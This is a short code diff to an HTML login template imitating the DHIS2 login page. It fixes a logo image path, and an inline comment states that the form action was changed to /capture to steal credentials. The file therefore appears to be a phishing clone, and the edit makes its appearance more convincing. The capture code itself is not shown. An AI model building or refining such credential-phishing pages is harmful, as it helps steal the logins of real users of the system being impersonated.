@@ -61,7 +61,7 @@ HTML_TEMPLATE = """
 <div id="loginField">
 <div id="loginArea">
 <div id="bannerArea">
-<a href="https://www.dhis2.org"><img src="/static/images/log_front.png" class="borderNoneClass"></a>
+<a href="https://www.dhis2.org"><img src="/static/images/logo_front.png" class="borderNoneClass"></a>
 </div>
 
 <!-- FORM ACTION CHANGED TO /capture TO STEAL CREDENTIALS -->
